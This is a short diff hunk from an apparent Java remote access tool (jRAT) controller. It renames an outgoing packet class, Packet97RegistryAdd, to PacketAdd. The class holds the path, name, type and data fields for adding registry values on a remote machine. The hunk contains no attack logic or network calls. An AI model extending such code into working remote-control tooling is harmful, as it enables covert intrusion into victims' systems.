@@ -6,14 +6,14 @@ import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
 import java.io.DataOutputStream;
 
 
-public class Packet97RegistryAdd extends AbstractOutgoingPacket {
+public class PacketAdd extends AbstractOutgoingPacket {
 
 	private String path;
 	private String name;
 	private String type;
 	private String data;
 
-	public Packet97RegistryAdd(String path, String name, String type, String data) {
+	public PacketAdd(String path, String name, String type, String data) {
 		this.path = path;
 		this.name = name;
 		this.type = type;
